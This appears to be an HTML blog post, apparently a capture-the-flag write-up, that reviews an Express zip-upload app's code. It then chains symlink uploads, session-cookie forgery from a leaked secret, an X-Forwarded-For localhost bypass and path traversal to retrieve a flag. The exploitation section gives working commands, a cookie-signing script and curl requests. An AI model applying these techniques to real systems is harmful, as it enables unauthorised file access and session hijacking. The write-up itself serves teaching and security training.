@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exploiting Symlink Upload and Session Forgery — awwfensive</title>
+    <link rel="icon" type="image/png" sizes="32x32" href="favicon.png">
+    <style>
+        body {
+            margin: 0;
+            padding: 20px;
+            font-family: monospace;
+            background: #fdfdfd;
+            color: #222;
+            font-size: 18px;
+            line-height: 1.7;
+        }
+        .container {
+            max-width: 720px;
+            margin: auto;
+        }
+        header {
+            margin-bottom: 2.5rem;
+            border-bottom: 2px solid #4caf50;
+            padding-bottom: 1rem;
+        }
+        h1 {
+            margin: 0 0 10px;
+            font-size: 2.5rem;
+            color: #000;
+            line-height: 1.2;
+        }
+        h1::before {
+            content: "$ ";
+            color: #4caf50;
+        }
+        .post-meta {
+            font-size: 1rem;
+            color: #666;
+            margin-bottom: 5px;
+        }
+        .post-tags {
+            margin-top: 10px;
+        }
+        .tag {
+            display: inline-block;
+            background: #f0f0f0;
+            color: #555;
+            padding: 3px 10px;
+            margin-right: 8px;
+            margin-bottom: 5px;
+            border-radius: 3px;
+            font-size: 0.9rem;
+        }
+        .tag::before {
+            content: "#";
+            color: #4caf50;
+            margin-right: 2px;
+        }
+        article {
+            margin-bottom: 3rem;
+        }
+        article h2 {
+            font-size: 1.8rem;
+            margin-top: 2rem;
+            margin-bottom: 1rem;
+            color: #000;
+        }
+        article h3 {
+            font-size: 1.4rem;
+            margin-top: 1.5rem;
+            margin-bottom: 0.8rem;
+            color: #111;
+        }
+        article h4 {
+            font-size: 1.2rem;
+            margin-top: 1.2rem;
+            margin-bottom: 0.6rem;
+            color: #222;
+        }
+        article p {
+            margin-bottom: 1.2rem;
+        }
+        article a {
+            color: #0066cc;
+            text-decoration: none;
+        }
+        article a:hover {
+            text-decoration: underline;
+        }
+        article code {
+            background: #f5f5f5;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-size: 0.95em;
+            color: #d63384;
+        }
+        article pre {
+            background: #2d2d2d;
+            color: #f8f8f2;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            line-height: 1.5;
+            margin: 1.5rem 0;
+        }
+        article pre code {
+            background: none;
+            color: inherit;
+            padding: 0;
+        }
+        article blockquote {
+            margin: 1.5rem 0;
+            padding-left: 20px;
+            border-left: 4px solid #4caf50;
+            color: #555;
+            font-style: italic;
+        }
+        article ul, article ol {
+            margin-bottom: 1.2rem;
+            padding-left: 2rem;
+        }
+        article li {
+            margin-bottom: 0.5rem;
+        }
+        article img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+            margin: 2rem auto;
+            border-radius: 5px;
+        }
+        .note {
+            background: #fffbea;
+            border-left: 4px solid #ffa500;
+            padding: 15px;
+            margin: 1.5rem 0;
+            border-radius: 3px;
+        }
+        .note strong {
+            color: #ff8c00;
+        }
+        .section-divider {
+            border: none;
+            border-top: 2px dashed #ccc;
+            margin: 2rem 0;
+        }
+        footer {
+            margin-top: 3rem;
+            font-size: 1rem;
+            color: #777;
+            text-align: center;
+        }
+        footer a {
+            color: #555;
+            text-decoration: none;
+        }
+        footer a:hover {
+            color: #0066cc;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Exploiting Symlink Upload and Session Forgery</h1>
+            <div class="post-meta">
+                <span>September 1, 2025</span> · 
+                <span>8 min read</span>
+            </div>
+            <div class="post-tags">
+                <span class="tag">TFC2025</span>
+                <span class="tag">codereview</span>
+                <span class="tag">403bypass</span>
+                <span class="tag">symlinks</span>
+                <span class="tag">express-session</span>
+            </div>
+        </header>
+
+        <article>
+            <p>
+                The application allows uploading a zip file, unzips it and serves its content to download. This seemingly simple functionality harbors multiple vulnerabilities that can be chained together for complete system compromise.
+            </p>
+
+            <hr class="section-divider">
+
+            <h2>Code Review</h2>
+
+            <h3>index.js</h3>
+            <pre><code>const express = require('express');
+const multer = require('multer');
+const path = require('path');
+const { execFile } = require('child_process');
+const fs = require('fs');
+const ensureSession = require('../middleware/session');
+const developmentOnly = require('../middleware/developmentOnly');
+
+const router = express.Router();
+
+router.use(ensureSession);
+
+const upload = multer({ dest: '/tmp' });
+
+router.get('/', (req, res) => {
+  res.render('index', { sessionId: req.session.userId });
+});
+
+router.get('/upload', (req, res) => {
+  res.render('upload');
+});
+
+router.post('/upload', upload.single('zipfile'), (req, res) => {
+    const zipPath = req.file.path;
+    const userDir = path.join(__dirname, '../uploads', req.session.userId);
+  
+    fs.mkdirSync(userDir, { recursive: true });
+  
+    // Command: unzip temp/file.zip -d target_dir
+    execFile('unzip', [zipPath, '-d', userDir], (err, stdout, stderr) => {
+      fs.unlinkSync(zipPath); // Clean up temp file
+  
+      if (err) {
+        console.error('Unzip failed:', stderr);
+        return res.status(500).send('Unzip error');
+      }
+  
+      res.redirect('/files');
+    });
+  });
+
+router.get('/files', (req, res) => {
+  const userDir = path.join(__dirname, '../uploads', req.session.userId);
+  fs.readdir(userDir, (err, files) => {
+    if (err) return res.status(500).send('Error reading files');
+    res.render('files', { files });
+  });
+});
+
+router.get('/files/:filename', (req, res) => {
+    const userDir = path.join(__dirname, '../uploads', req.session.userId);
+    const requestedPath = path.normalize(req.params.filename);
+    const filePath = path.resolve(userDir, requestedPath);
+  
+    // Prevent path traversal
+    if (!filePath.startsWith(path.resolve(userDir))) {
+      return res.status(400).send('Invalid file path');
+    }
+  
+    if (fs.existsSync(filePath) && fs.statSync(filePath).isFile()) {
+      res.download(filePath);
+    } else {
+      res.status(404).send('File not found');
+    }
+  });
+
+router.get('/debug/files', developmentOnly, (req, res) => {
+    const userDir = path.join(__dirname, '../uploads', req.query.session_id);
+    fs.readdir(userDir, (err, files) => {
+    if (err) return res.status(500).send('Error reading files');
+    res.render('files', { files });
+  });
+});
+
+module.exports = router;</code></pre>
+
+            <hr class="section-divider">
+
+            <h3>Review</h3>
+
+            <h4>Upload Functionality</h4>
+            <pre><code>router.post('/upload', upload.single('zipfile'), (req, res) => {
+    const zipPath = req.file.path;
+    const userDir = path.join(__dirname, '../uploads', req.session.userId);
+  
+    fs.mkdirSync(userDir, { recursive: true });
+  
+    // Command: unzip temp/file.zip -d target_dir
+    execFile('unzip', [zipPath, '-d', userDir], (err, stdout, stderr) => {
+      fs.unlinkSync(zipPath); // Clean up temp file
+  
+      if (err) {
+        console.error('Unzip failed:', stderr);
+        return res.status(500).send('Unzip error');
+      }
+  
+      res.redirect('/files');
+    });
+  });</code></pre>
+
+            <ul>
+                <li><code>userDir</code> variable creates a path for each user's directory under uploads folder, that is their <code>userId</code></li>
+                <li><code>fs.mkdirSync(userDir, { recursive: true });</code> creates the directory</li>
+                <li>The uploaded file is first stored inside <code>/tmp</code> folder, then the file is unzipped to be stored in the path stored inside <code>userDir</code> variable</li>
+            </ul>
+
+            <h4>Files Listing</h4>
+            <pre><code>router.get('/files', (req, res) => {
+  const userDir = path.join(__dirname, '../uploads', req.session.userId);
+  fs.readdir(userDir, (err, files) => {
+    if (err) return res.status(500).send('Error reading files');
+    res.render('files', { files });
+  });
+});</code></pre>
+
+            <p>The files are displayed to the users once unzipped on <code>/files</code> endpoint from <code>/uploads/userId</code> path.</p>
+
+            <h4>File Download</h4>
+            <pre><code>router.get('/files/:filename', (req, res) => {
+    const userDir = path.join(__dirname, '../uploads', req.session.userId);
+    const requestedPath = path.normalize(req.params.filename);
+    const filePath = path.resolve(userDir, requestedPath);
+  
+    // Prevent path traversal
+    if (!filePath.startsWith(path.resolve(userDir))) {
+      return res.status(400).send('Invalid file path');
+    }
+  
+    if (fs.existsSync(filePath) && fs.statSync(filePath).isFile()) {
+      res.download(filePath);
+    } else {
+      res.status(404).send('File not found');
+    }
+  });</code></pre>
+
+            <ul>
+                <li>When the user clicks on the download button, <code>/files/:filename</code> endpoint is called</li>
+                <li>This part attempts to prevent path traversal by retrieving <code>userDir</code> that contains <code>userId</code> and if the user attempts to access some other user's file the server responds with 400</li>
+            </ul>
+
+            <h4>Path Traversal in /debug/files</h4>
+
+            <p>Here comes the interesting part:</p>
+
+            <pre><code>router.get('/debug/files', developmentOnly, (req, res) => {
+    const userDir = path.join(__dirname, '../uploads', req.query.session_id);
+    fs.readdir(userDir, (err, files) => {
+    if (err) return res.status(500).send('Error reading files');
+    res.render('files', { files });
+  });
+});</code></pre>
+
+            <ul>
+                <li><code>router.get('/debug/files', developmentOnly, (req, res)</code> suggests that <code>/debug/files</code> endpoint is development only endpoint</li>
+                <li>This hints us to review the code for <code>developmentOnly</code></li>
+            </ul>
+
+            <p>The path created here is:</p>
+            <ul>
+                <li><code>__dirname</code>: <code>/home/aniket/src/routes</code></li>
+                <li><code>../uploads</code> makes it: <code>/home/aniket/src/uploads</code></li>
+                <li><code>req.query.session_id</code>: This <code>session_id</code> is retrieved from <code>session_id</code> parameter (<code>/debug/files?session_id=xyz</code>)</li>
+            </ul>
+
+            <p>This results in <code>/home/aniket/src/uploads/xyz</code> value in <code>userDir</code>.</p>
+
+            <div class="note">
+                <strong>Vulnerability:</strong> Since there is no sanitization on <code>session_id</code> inputs, attacker can input path traversal payloads (<code>../../../</code>)
+            </div>
+
+            <hr class="section-divider">
+
+            <h3>developmentonly.js</h3>
+            <pre><code>module.exports = function (req, res, next) {
+    if (req.session.userId === 'develop' && req.ip == '127.0.0.1') {
+      return next();
+    }
+    res.status(403).send('Forbidden: Development access only');
+  };</code></pre>
+
+            <p>Therefore, to be able to make request to the debug endpoint, we must have <code>userId</code> develop and internal IP to make any valid request.</p>
+
+            <hr class="section-divider">
+
+            <h3>server.js</h3>
+            <pre><code>const express = require('express');
+const session = require('express-session');
+const path = require('path');
+const fs = require('fs');
+require('dotenv').config();
+
+
+const app = express();
+
+// Middleware
+app.use(express.urlencoded({ extended: false }));
+app.use(express.static('public'));
+
+// Session
+const store = new session.MemoryStore();
+const sessionData = {
+    cookie: {
+      path: '/',
+      httpOnly: true,
+      maxAge: 1000 * 60 * 60 * 48 // 1 hour
+    },
+    userId: 'develop'
+};
+// redacted for players > 
+store.set('&lt;redacted&gt;', sessionData, err => {
+    if (err) console.error('Failed to create develop session:', err);
+    else console.log('Development session created!');
+  });
+
+app.use(session({
+  secret: process.env.SESSION_SECRET,
+  resave: false,
+  saveUninitialized: false,
+  store: store
+}));
+
+app.set('view engine', 'ejs');
+app.set('views', path.join(__dirname, 'views'));
+app.set('trust proxy', true);
+
+// Ensure uploads dir exists
+const uploadsDir = path.join(__dirname, 'uploads');
+if (!fs.existsSync(uploadsDir)) fs.mkdirSync(uploadsDir);
+
+// Routes
+const indexRoutes = require('./routes/index');
+app.use('/', indexRoutes);
+
+app.listen(3000, () => {
+  console.log('Server running at http://localhost:3000');
+});</code></pre>
+
+            <h4>Review</h4>
+            <pre><code>store.set('&lt;redacted&gt;', sessionData, err => {
+    if (err) console.error('Failed to create develop session:', err);
+    else console.log('Development session created!');
+  });</code></pre>
+
+            <p>The server script contains <strong>session ID</strong>.</p>
+
+            <pre><code>app.use(session({
+  secret: process.env.SESSION_SECRET,
+  resave: false,
+  saveUninitialized: false,
+  store: store
+}));</code></pre>
+
+            <p>It also retrieves the secret from the <code>.env</code> file. The server script requires <code>dotenv</code> package (<code>require('dotenv').config();</code>). This loads the <strong>.env</strong> file into <code>process.env</code> (Node's global object for environment variables). Now the value can be accessed like: <code>process.env.&lt;variablename&gt;</code></p>
+
+            <h3>What we know?</h3>
+            <ol>
+                <li>From the server side we could enumerate <code>SESSION_SECRET</code> and <code>session_id</code></li>
+                <li>The application unzips the uploaded zip file</li>
+                <li><code>/debug/files?session_id=</code> is vulnerable to path traversal</li>
+            </ol>
+
+            <hr class="section-divider">
+
+            <h2>Exploitation</h2>
+
+            <p>Uploading zip file of <code>symlinks</code> pointing to <code>/apps/.env</code> and <code>/apps/server.js</code>.</p>
+
+            <p>The server unzips env and server symlink files. Once you download both these files, the referenced files are downloaded:</p>
+
+            <pre><code>secret: 3df35e5dd772dd98a6feb5475d0459f8e18e08a46f48ec68234173663fca377b
+session_id: amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E</code></pre>
+
+            <p>With cookie secret and raw session id we can create developer's session id:</p>
+
+            <pre><code>const signature = require('cookie-signature');
+
+const sid = 'amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E';         // raw session id
+const secret = '3df35e5dd772dd98a6feb5475d0459f8e18e08a46f48ec68234173663fca377b';          // express-session secret
+
+// Sign the session ID
+const signed = 's:' + signature.sign(sid, secret);
+
+console.log('connect.sid=' + signed);</code></pre>
+
+            <pre><code>┌──(kali㉿kali)-[/tmp]
+└─$ node /tmp/recreatecookie.js
+connect.sid=s:amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E.R3H281arLqbqxxVlw9hWgdoQRZpcJElSLSSn6rdnloE</code></pre>
+
+            <p>This cookie can now be used to make valid requests to debug endpoint.</p>
+
+            <p><strong>Request:</strong></p>
+            <pre><code>┌──(kali㉿kali)-[/tmp]
+└─$ curl http://localhost:3000/debug/files?session_id=../../../g67phz7m -H "Cookie: connect.sid=s:amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E.R3H281arLqbqxxVlw9hWgdoQRZpcJElSLSSn6rdnloE" -H "X-Forwarded-For: 127.0.0.1"</code></pre>
+
+            <p><strong>Response:</strong></p>
+            <pre><code>&lt;div class="container"&gt;
+  &lt;h2&gt;Your Uploaded Files&lt;/h2&gt;
+  &lt;ul class="list-group"&gt;                                                 
+    &lt;li class="list-group-item"&gt;
+      flag.txt                                                             
+      &lt;a href="/files/flag.txt" class="button"&gt;Download&lt;/a&gt;                
+    &lt;/li&gt;                                                                  
+  &lt;/ul&gt;                                                                      
+  &lt;a href="/upload" class="button"&gt;Upload More&lt;/a&gt;                             
+  &lt;a href="/" class="button"&gt;Home&lt;/a&gt;                                          
+&lt;/div&gt;</code></pre>
+
+            <h3>Final Steps</h3>
+            <ol>
+                <li>Create symlink to flag:
+                    <pre><code>ln -s /files/flag.txt flag
+zip flag.zip flag</code></pre>
+                </li>
+                <li>Upload the zip and download the flag!</li>
+            </ol>
+
+            <div class="note">
+                <strong>Key Takeaway:</strong> This exploit chain combines symlink traversal, session forgery, and authentication bypass to access sensitive files. Always validate file uploads, sanitize path inputs, and protect development endpoints properly.
+            </div>
+        </article>
+
+        <footer>
+            <hr style="border: none; border-top: 1px dashed #ccc; margin-bottom: 10px;">
+            <nav style="text-align: center; font-size: 1.2rem;">
+                <a href="index.html">~/</a> · 
+                <a href="pages.html">pages</a>
+            </nav>
+            <div style="font-size: 0.95rem; color: #666; margin-top: 5px;">
+                back to safety.
+            </div>
+        </footer>
+    </div>
+</body>
+</html>
